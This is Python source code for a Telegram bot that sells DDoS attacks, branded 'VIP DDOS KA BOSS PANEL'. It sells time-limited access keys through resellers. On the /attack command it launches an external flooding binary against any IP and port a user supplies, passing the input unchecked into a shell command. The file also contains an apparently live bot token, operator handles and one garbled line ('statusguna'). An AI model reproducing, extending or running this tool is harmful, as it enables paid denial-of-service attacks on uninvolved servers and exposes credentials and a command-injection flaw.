import os
import json
import time
import random
import string
import telebot
import datetime
from telebot import types
from dateutil.relativedelta import relativedelta
import subprocess
import threading

# Bot token (replace with your Telegram bot token)
bot = telebot.TeleBot('7576183544:AAFbwSF8YrBQG2IjJYsv4VjA_PBiXm6x040')

# Permanent Admins (cannot be removed)
PERMANENT_ADMINS = {
    "1807014348": "@sadiq9869",
    "6258297180": "@Rahul_618"
}

# Super Admin for exclusive commands
SUPER_ADMIN = "1807014348"  # Only @sadiq9869 can use /shutdown, /stop, /broadcast, /viewusers, /addgroup, /approve, /disapprove

# Files for data storage
USER_FILE = "users.json"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
LOG_FILE = "log.txt"
ADMIN_FILE = "admins.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# Attack settings
DEFAULT_PACKET_SIZE = 1200  # Matches Rohan.c constraints
MAX_ATTACK_DURATION = 240  # Max duration for non-super admins (seconds)

# In-memory storage
users = {}
keys = {}
resellers = {}
admins = {}
last_attack_time = {}

def load_data():
    global users, keys, resellers, admins
    users = read_json(USER_FILE, {})
    keys = read_json(KEY_FILE, {})
    resellers = read_json(RESELLERS_FILE, {})
    admins = read_json(ADMIN_FILE, {})

def read_json(file, default):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=4)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ARMY-PK-{random_key.upper()}"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    return current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Max Enhanced Touchscreen UI
def create_main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    attack_btn = types.KeyboardButton("🚀 ATTACK")
    info_btn = types.KeyboardButton("👤 MERA INFO")
    redeem_btn = types.KeyboardButton("🎟️ REDEEM KEY")
    markup.add(attack_btn, info_btn, redeem_btn)
    
    if user_id in resellers:
        balance_btn = types.KeyboardButton("💰 BALANCE CHECK")
        genkey_btn = types.KeyboardButton("🔑 KEY BANAO")
        markup.add(balance_btn, genkey_btn)
    
    if is_admin(user_id):
        admin_btn = types.KeyboardButton("👑 ADMIN DASHBOARD")
        markup.add(admin_btn)
    
    return markup

def create_admin_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    gen_btn = types.KeyboardButton("🔑 KEY BANAO")
    listkey_btn = types.KeyboardButton("📜 SAB KEYS DEKHO")
    block_btn = types.KeyboardButton("🚫 KEY BLOCK KARO")
    addadmin_btn = types.KeyboardButton("➕ ADMIN ADD KARO")
    removeadmin_btn = types.KeyboardButton("➖ ADMIN HATAO")
    addreseller_btn = types.KeyboardButton("🏦 RESELLER ADD KARO")
    resellers_btn = types.KeyboardButton("🎖️ RESELLERS DEKHO")
    addbalance_btn = types.KeyboardButton("💸 RESELLER BALANCE ADD")
    removereseller_btn = types.KeyboardButton("🗑️ RESELLER HATAO")
    back_btn = types.KeyboardButton("🔙 WAPAS JAO")
    markup.add(gen_btn, listkey_btn, block_btn, addadmin_btn, removeadmin_btn, 
               addreseller_btn, resellers_btn, addbalance_btn, removereseller_btn, back_btn)
    return markup

def is_admin(user_id):
    return user_id in PERMANENT_ADMINS or user_id in admins

def is_super_admin(user_id):
    return user_id == SUPER_ADMIN

# Start Command
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    role = "SUPER BOSS" if is_super_admin(user_id) else "ADMIN" if is_admin(user_id) else "RESELLER" if user_id in resellers else "USER" if user_id in users else "GUEST"
    markup = create_main_menu(user_id)
    bot.reply_to(message, f"🔥 *VIP DDOS KA BOSS PANEL* 🔥\n\nTera Role: `{role}`\n👇 Option chun le:", reply_markup=markup, parse_mode='Markdown')

# Help Command (Role-based with Hinglish Examples)
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if is_admin(user_id) and not is_super_admin(user_id):
        help_text = """
💎 *ADMIN KA JORDAAR PANEL* 💎
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *BASIC COMMANDS:* 🔥
/start - Bot shuru karo! 🚀
/help - Ye guide dekho! 📖
/attack <ip> <port> <time> - Attack maro (max 240s)! ⚡
  *Example:* `/attack 1.2.3.4 80 120` se 120 second ka attack!

⚡ *ADMIN KE POWERS:* ⚡
/gen <duration> <key_name> - Nayi key banao! 🔑
  *Example:* `/gen 1day MY_KEY` se 1 din ki key!
/listkey - Sari keys dekho! 📜
  *Example:* `/listkey` se sab keys ki list!
/block <key_name> - Key block karo! 🚫
  *Example:* `/block MY_KEY` se key band!
/addadmin <user_id> - Naya admin add karo! 👑
  *Example:* `/addadmin 123456789` se admin banao!
/removeadmin <user_id> - Admin hatao! 🗑️
  *Example:* `/removeadmin 123456789` se admin hatao!
/add_reseller <user_id> <balance> - Reseller add karo! 🏦
  *Example:* `/add_reseller 987654321 1000` se reseller aur 1000 Rs!
/resellers - Sare resellers dekho! 🎖️
  *Example:* `/resellers` se reseller list!
/addbalance <reseller_id> <amount> - Reseller ka balance badhao! 💰
  *Example:* `/addbalance 987654321 500` se 500 Rs add!
/remove_reseller <reseller_id> - Reseller hatao! ⚰️
  *Example:* `/remove_reseller 987654321` se reseller hatao!

━━━━━━━━━━━━━━━━━━━━━━━
💬 *Koi dikkat? @sadiq9869 ya @Rahul_618 se baat kar!* 👑
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    elif user_id in resellers:
        help_text = """
💼 *RESELLER KA MAST DASHBOARD* 💼
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *USER COMMANDS:* 🔥
/start - Bot shuru karo! 🚀
/redeem <key_name> - Key redeem karo! 🎟️
  *Example:* `/redeem MY_KEY` se key use karo!
/attack <ip> <port> <time> - Attack maro (max 240s)! ⚡
  *Example:* `/attack 1.2.3.4 80 120` se 120 second ka attack!

💰 *RESELLER COMMANDS:* 💰
/genkey <duration> <key_name> - Nayi key banao! 🔑
  *Example:* `/genkey 1day MY_KEY` se 1 din ki key!
/balance - Apna balance dekho! 💸
  *Example:* `/balance` se paisa check karo!

━━━━━━━━━━━━━━━━━━━━━━━
💬 *Koi dikkat? @sadiq9869 ya @Rahul_618 se baat kar!* 👑
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    else:
        help_text = """
🌟 *USER KA COOL PORTAL* 🌟
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *USER COMMANDS:* 🔥
/start - Bot shuru karo! 🚀
/redeem <key_name> - Key redeem karo! 🎟️
  *Example:* `/redeem MY_KEY` se key use karo!
/attack <ip> <port> <time> - Attack maro (max 240s)! ⚡
  *Example:* `/attack 1.2.3.4 80 120` se 120 second ka attack!

━━━━━━━━━━━━━━━━━━━━━━━
💬 *Koi dikkat? @sadiq9869 ya @Rahul_618 se baat kar!* 👑
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')

# Attack Command (User, Reseller, Admin)
@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.chat.id)
    if user_id not in users:
        bot.reply_to(message, "⛔️ *Access Nahi Hai!* ⛔️\n\nPehle key redeem karo! Contact: @sadiq9869 ya @Rahul_618", parse_mode='Markdown')
        return
    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
    if datetime.datetime.now() > expiration_date:
        bot.reply_to(message, "❗️ *Tera access khatam!* Contact @sadiq9869 ya @Rahul_618 to renew!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/attack <ip> <port> <time>`\n\nExample: `/attack 1.2.3.4 80 120`", parse_mode='Markdown')
        return
    target, port, time = command[1], command[2], command[3]
    try:
        port = int(port)
        time = int(time)
        if time <= 0:
            raise ValueError("Time must be positive")
        if not is_super_admin(user_id) and time > MAX_ATTACK_DURATION:
            bot.reply_to(message, f"❌ *Max attack time {MAX_ATTACK_DURATION} seconds hai!*", parse_mode='Markdown')
            return
        log_command(user_id, target, port, time)
        full_command = f"./rohan {target} {port} {time} {DEFAULT_PACKET_SIZE}"
        username = message.chat.username or "No username"
        response = f"🚀 *Attack Shuru!* 🚀\n\nTarget: `{target}:{port}`\nTime: `{time}` seconds\nBy: `@{username}`"
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: bot.send_message(message.chat.id, f"✅ *Attack Khatam!* Target: `{target}:{port}`", parse_mode='Markdown')).start()
        last_attack_time[user_id] = datetime.datetime.now()
        bot.reply_to(message, response, parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ *Port ya time galat hai!*", parse_mode='Markdown')

# Generate Key (Admin)
@bot.message_handler(commands=['gen'])
def generate_key(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins key bana sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/gen <duration> <key_name>`\n\nExample: `/gen 1day MY_KEY`", parse_mode='Markdown')
        return
    duration, key_name = command[1], command[2]
    if key_name in keys:
        bot.reply_to(message, "❌ *Ye key name pehle se hai!*", parse_mode='Markdown')
        return
    key = create_random_key()
    keys[key_name] = {"key": key, "duration": duration, "expiration_time": None, "blocked": False}
    save_json(KEY_FILE, keys)
    bot.reply_to(message, f"✅ *Key Ban Gaya!*\n\nKey: `{key}`\nName: `{key_name}`\nDuration: `{duration}`", parse_mode='Markdown')

# List Keys (Admin)
@bot.message_handler(commands=['listkey'])
def list_keys(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins keys dekh sakte hain!", parse_mode='Markdown')
        return
    if not keys:
        bot.reply_to(message, "⚠️ *Koi key nahi mili!*", parse_mode='Markdown')
        return
    response = "🔑 *Active Keys* 🔑\n\n"
    for key_name, data in keys.items():
        statusguna
        status = "Blocked" if data["blocked"] else "Active"
        response += f"• Name: `{key_name}`\n  Key: `{data['key']}`\n  Duration: `{data['duration']}`\n  Status: `{status}`\n\n"
    bot.reply_to(message, response, parse_mode='Markdown')

# Block Key (Admin)
@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins key block kar sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/block <key_name>`\n\nExample: `/block MY_KEY`", parse_mode='Markdown')
        return
    key_name = command[1]
    if key_name not in keys:
        bot.reply_to(message, "❌ *Ye key nahi mili!*", parse_mode='Markdown')
        return
    keys[key_name]["blocked"] = True
    save_json(KEY_FILE, keys)
    bot.reply_to(message, f"✅ *Key `{key_name}` block ho gaya!*", parse_mode='Markdown')

# Redeem Key (User, Reseller)
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/redeem <key_name>`\n\nExample: `/redeem MY_KEY`", parse_mode='Markdown')
        return
    key_name = command[1]
    if key_name not in keys or keys[key_name]["blocked"]:
        bot.reply_to(message, "📛 *Galat ya block key hai!* 📛", parse_mode='Markdown')
        return
    if user_id in users:
        current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() < current_expiration:
            bot.reply_to(message, "❕ *Tera pehle se active access hai!*", parse_mode='Markdown')
            return
    duration = keys[key_name]["duration"]
    try:
        num = int(''.join(filter(str.isdigit, duration)))
        unit = ''.join(filter(str.isalpha, duration)).lower()
        if unit in ["hour", "hours"]:
            expiration_time = add_time_to_current_date(hours=num)
        elif unit in ["day", "days"]:
            expiration_time = add_time_to_current_date(days=num)
        elif unit in ["week", "weeks"]:
            expiration_time = add_time_to_current_date(days=num * 7)
        elif unit in ["month", "months"]:
            expiration_time = add_time_to_current_date(months=num)
        else:
            bot.reply_to(message, "❌ *Galat duration format!*", parse_mode='Markdown')
            return
    except ValueError:
        bot.reply_to(message, "❌ *Galat duration format!*", parse_mode='Markdown')
        return
    users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
    save_json(USER_FILE, users)
    del keys[key_name]
    save_json(KEY_FILE, keys)
    bot.reply_to(message, f"✅ *Access mil gaya!*\n\nExpires on: `{users[user_id]}`", parse_mode='Markdown')

# Add Admin (Admin)
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins naye admin add kar sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/addadmin <user_id>`\n\nExample: `/addadmin 123456789`", parse_mode='Markdown')
        return
    new_admin_id = command[1]
    if new_admin_id in PERMANENT_ADMINS:
        bot.reply_to(message, "❌ *Permanent admins ko change nahi kar sakte!*", parse_mode='Markdown')
        return
    admins[new_admin_id] = "Admin"
    save_json(ADMIN_FILE, admins)
    bot.reply_to(message, f"✅ *User {new_admin_id} ab admin hai!*", parse_mode='Markdown')

# Remove Admin (Admin)
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins admin hata sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/removeadmin <user_id>`\n\nExample: `/removeadmin 123456789`", parse_mode='Markdown')
        return
    admin_id = command[1]
    if admin_id in PERMANENT_ADMINS:
        bot.reply_to(message, "❌ *Permanent admins ko hata nahi sakte!*", parse_mode='Markdown')
        return
    if admin_id in admins:
        del admins[admin_id]
        save_json(ADMIN_FILE, admins)
        bot.reply_to(message, f"✅ *Admin {admin_id} hata diya gaya!*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ *Ye user admin nahi hai!*", parse_mode='Markdown')

# Add Reseller (Admin)
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins reseller add kar sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/add_reseller <user_id> <balance>`\n\nExample: `/add_reseller 987654321 1000`", parse_mode='Markdown')
        return
    reseller_id, balance = command[1], command[2]
    try:
        balance = int(balance)
    except ValueError:
        bot.reply_to(message, "❌ *Galat balance amount!*", parse_mode='Markdown')
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = balance
        save_json(RESELLERS_FILE, resellers)
        bot.reply_to(message, f"✅ *Reseller add ho gaya!*\n\nID: `{reseller_id}`\nBalance: `{balance}` Rs", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ *Reseller {reseller_id} pehle se hai!*", parse_mode='Markdown')

# Reseller Generate Key (Reseller, Admin)
@bot.message_handler(commands=['genkey'])
def reseller_generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/genkey <duration> <key_name>`\n\nExample: `/genkey 1day MY_KEY`", parse_mode='Markdown')
        return
    duration, key_name = command[1].lower(), command[2]
    if duration not in KEY_COST and not is_admin(user_id):
        bot.reply_to(message, "❌ *Galat duration!*", parse_mode='Markdown')
        return
    cost = KEY_COST.get(duration, 0)
    if is_admin(user_id):
        key = create_random_key()
        keys[key_name] = {"key": key, "duration": duration, "expiration_time": None, "blocked": False}
        save_json(KEY_FILE, keys)
        response = f"✅ *Key ban gaya!*\n\nKey: `{key}`\nName: `{key_name}`\nDuration: `{duration}`"
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_json(RESELLERS_FILE, resellers)
            key = create_random_key()
            keys[key_name] = {"key": key, "duration": duration, "expiration_time": None, "blocked": False}
            save_json(KEY_FILE, keys)
            response = f"✅ *Key ban gaya!*\n\nKey: `{key}`\nName: `{key_name}`\nDuration: `{duration}`\nCost: `{cost}` Rs\nBalance: `{resellers[user_id]}` Rs"
        else:
            response = f"❌ *Balance kam hai!*\n\nChahiye: `{cost}` Rs\nAvailable: `{resellers[user_id]}` Rs"
    else:
        response = "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins ya resellers key bana sakte hain!"
    bot.reply_to(message, response, parse_mode='Markdown')

# Check Reseller Balance (Reseller)
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        bot.reply_to(message, f"💰 *Tera balance:* `{resellers[user_id]}` Rs", parse_mode='Markdown')
    else:
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf resellers balance dekh sakte hain!", parse_mode='Markdown')

# View Resellers (Admin)
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins resellers dekh sakte hain!", parse_mode='Markdown')
        return
    if not resellers:
        bot.reply_to(message, "⚠️ *Koi reseller nahi mila!*", parse_mode='Markdown')
        return
    response = "✅ *Authorized Resellers* ✅\n\n"
    for reseller_id, balance in resellers.items():
        username = bot.get_chat(reseller_id).username or "Unknown"
        response += f"• Username: `@{username}`\n  UserID: `{reseller_id}`\n  Balance: `{balance}` Rs\n\n"
    bot.reply_to(message, response, parse_mode='Markdown')

# Add Reseller Balance (Admin)
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins balance add kar sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/addbalance <reseller_id> <amount>`\n\nExample: `/addbalance 987654321 500`", parse_mode='Markdown')
        return
    reseller_id, amount = command[1], command[2]
    try:
        amount = float(amount)
    except ValueError:
        bot.reply_to(message, "❌ *Galat amount!*", parse_mode='Markdown')
        return
    if reseller_id not in resellers:
        bot.reply_to(message, "❌ *Reseller nahi mila!*", parse_mode='Markdown')
        return
    resellers[reseller_id] += amount
    save_json(RESELLERS_FILE, resellers)
    bot.reply_to(message, f"✅ *Balance add ho gaya!*\n\nAmount: `{amount}` Rs\nReseller ID: `{reseller_id}`\nNaya Balance: `{resellers[reseller_id]}` Rs", parse_mode='Markdown')

# Remove Reseller (Admin)
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins reseller hata sakte hain!", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/remove_reseller <reseller_id>`\n\nExample: `/remove_reseller 987654321`", parse_mode='Markdown')
        return
    reseller_id = command[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "❌ *Reseller nahi mila!*", parse_mode='Markdown')
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    bot.reply_to(message, f"✅ *Reseller `{reseller_id}` hata diya gaya!*", parse_mode='Markdown')

# Attack Button (User, Reseller, Admin)
@bot.message_handler(func=lambda message: message.text == "🚀 ATTACK")
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id not in users:
        bot.reply_to(message, "⛔️ *Access Nahi Hai!* ⛔️\n\nPehle key redeem karo! Contact: @sadiq9869 ya @Rahul_618", parse_mode='Markdown')
        return
    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
    if datetime.datetime.now() > expiration_date:
        bot.reply_to(message, "❗️ *Tera access khatam!* Contact @sadiq9869 ya @Rahul_618 to renew!", parse_mode='Markdown')
        return
    bot.reply_to(message, "🎯 *Type kar: /attack <ip> <port> <time>*\n\nExample: `/attack 1.2.3.4 80 120`\nMax time: 240s (@sadiq9869 ke liye no limit)", parse_mode='Markdown')

# My Info (User, Reseller, Admin)
@bot.message_handler(func=lambda message: message.text == "👤 MERA INFO")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "SUPER BOSS" if is_super_admin(user_id) else "ADMIN" if is_admin(user_id) else "RESELLER" if user_id in resellers else "USER" if user_id in users else "GUEST"
    key_expiration = users.get(user_id, "Koi active key nahi")
    balance = resellers.get(user_id, "Nahi hai") if role == "RESELLER" else "Nahi hai"
    response = (
        f"👤 *TERA INFO* 👤\n\n"
        f"ℹ️ Username: `@{username}`\n"
        f"🆔 UserID: `{user_id}`\n"
        f"🚹 Role: `{role}`\n"
        f"🕘 Expires: `{key_expiration}`\n"
        f"💰 Balance: `{balance}`"
    )
    bot.reply_to(message, response, parse_mode='Markdown')

# Admin Panel Button
@bot.message_handler(func=lambda message: message.text == "👑 ADMIN DASHBOARD")
def admin_panel(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf admins isse use kar sakte hain!", parse_mode='Markdown')
        return
    markup = create_admin_menu()
    bot.reply_to(message, "👑 *ADMIN KA JORDAAR DASHBOARD* 👑\n\nOption chun le:", reply_markup=markup, parse_mode='Markdown')

# Back to Main Menu
@bot.message_handler(func=lambda message: message.text == "🔙 WAPAS JAO")
def back_to_main(message):
    user_id = str(message.chat.id)
    markup = create_main_menu(user_id)
    bot.reply_to(message, "🔥 *MAIN MENU* 🔥\n\nOption chun le:", reply_markup=markup, parse_mode='Markdown')

# Check Balance Button (Reseller)
@bot.message_handler(func=lambda message: message.text == "💰 BALANCE CHECK")
def check_balance_button(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        bot.reply_to(message, f"💰 *Tera balance:* `{resellers[user_id]}` Rs", parse_mode='Markdown')
    else:
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf resellers balance dekh sakte hain!", parse_mode='Markdown')

# Generate Key Button (Reseller, Admin)
@bot.message_handler(func=lambda message: message.text == "🔑 KEY BANAO")
def genkey_button(message):
    user_id = str(message.chat.id)
    if user_id in resellers or is_admin(user_id):
        bot.reply_to(message, "🔑 *Type kar: /genkey <duration> <key_name>*\n\nExample: `/genkey 1day MY_KEY`", parse_mode='Markdown')
    else:
        bot.reply_to(message, "🚫 *Access Nahi Hai!* ⛔️\n\nSirf resellers ya admins key bana sakte hain!", parse_mode='Markdown')

# Super Admin Commands (only @sadiq9869)
@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    bot.reply_to(message, "🔴 *Bot band ho raha hai...*")
    save_json(USER_FILE, users)
    save_json(KEY_FILE, keys)
    save_json(RESELLERS_FILE, resellers)
    save_json(ADMIN_FILE, admins)
    bot.stop_bot()
    raise SystemExit

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    bot.reply_to(message, "🛑 *Attack rok diya @sadiq9869 ne!*", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "❌ *Galat Format!* Use: `/broadcast <message>`\n\nExample: `/broadcast Sabko bol do attack ready hai!`", parse_mode='Markdown')
        return
    msg = command[1]
    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 *@sadiq9869 ka Message* 📢\n\n{msg}", parse_mode='Markdown')
        except:
            continue
    bot.reply_to(message, "✅ *Broadcast bhej diya!*", parse_mode='Markdown')

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    if not users:
        bot.reply_to(message, "⚠️ *Koi authorized user nahi mila!*", parse_mode='Markdown')
        return
    response = "✅ *Authorized Users* ✅\n\n"
    for user, expiration in users.items():
        user_info = bot.get_chat(user)
        username = user_info.username or user_info.first_name
        response += f"• User ID: `{user}`\n  Username: `@{username}`\n  Expires: `{expiration}`\n\n"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['addgroup'])
def add_group(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    bot.reply_to(message, "✅ *Group add kiya @sadiq9869 ne!*", parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_group(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    bot.reply_to(message, "✅ *Group approve kiya @sadiq9869 ne!*", parse_mode='Markdown')

@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    user_id = str(message.chat.id)
    if not is_super_admin(user_id):
        bot.reply_to(message, "🚫 *Ye command nahi mila!*", parse_mode='Markdown')
        return
    bot.reply_to(message, "✅ *Group disapprove kiya @sadiq9869 ne!*", parse_mode='Markdown')

# Main loop
if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)